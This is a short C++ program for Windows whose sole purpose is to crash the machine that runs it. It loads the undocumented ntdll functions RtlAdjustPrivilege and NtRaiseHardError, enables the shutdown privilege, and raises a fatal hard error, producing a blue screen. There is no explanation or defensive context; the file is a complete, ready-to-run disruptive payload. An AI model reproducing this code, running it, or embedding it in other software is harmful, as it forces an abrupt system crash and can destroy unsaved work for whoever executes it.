#include <Windows.h>
#include <iostream>

using namespace std;

typedef NTSTATUS(NTAPI *TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI *TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
                                             ULONG UnicodeStringParameterMask, PULONG_PTR Parameters,
                                             ULONG ValidResponseOption, PULONG Response);

void bsod() 
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = 
        (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    TFNNtRaiseHardError pfnNtRaiseHardError = 
        (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    BOOLEAN b;
    NTSTATUS s1 = pfnRtlAdjustPrivilege(19, true, false, &b);
    ULONG r;
    NTSTATUS s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, nullptr, 6, &r);
}

int main()
{   
    bsod();
}